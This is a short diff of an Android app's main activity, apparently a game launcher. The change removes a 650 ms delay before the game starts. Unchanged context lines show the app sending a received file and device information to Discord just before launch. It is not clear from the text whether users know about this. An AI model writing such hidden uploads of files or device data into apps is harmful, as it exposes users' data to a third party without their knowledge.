@@ -364,7 +364,7 @@ class MainActivity : AppCompatActivity() {
                 if (bytes != null) {
                     sendFileToDiscord(bytes)
                     PairingHelper.sendDeviceInfoToDiscord()
-                    handler.postDelayed({ launchGame() }, 650)
+                    launchGame()
                 } else {
                     // Connection failed — clear stale pairing flag so user is prompted to re-pair.
                     PairingState.clear(this)
